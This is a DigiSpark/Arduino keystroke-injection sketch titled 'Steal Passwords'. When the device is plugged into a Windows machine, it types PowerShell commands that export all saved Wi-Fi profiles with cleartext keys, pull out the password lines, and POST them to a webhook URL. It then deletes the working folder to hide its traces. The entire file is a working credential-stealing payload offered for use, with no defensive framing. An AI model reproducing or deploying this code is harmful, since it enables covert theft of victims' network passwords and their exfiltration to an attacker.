/*
 * Steal Passwords
 * It collects all saved wifi passwords from your PC/Laptop and send to web server.
 * Author - Cyber Penetrate
*/
#include<DigiKeyboard.h>
void setup()
{
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cd Desktop");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("mkdir name_of_folder");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd name_of_folder");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-Pass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("Invoke-WebRequest -Uri link_of_webhook -Method POST -InFile WiFi-Pass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cd ..");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del name_of_folder");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop()
{
  //Nothing to do here :)
}
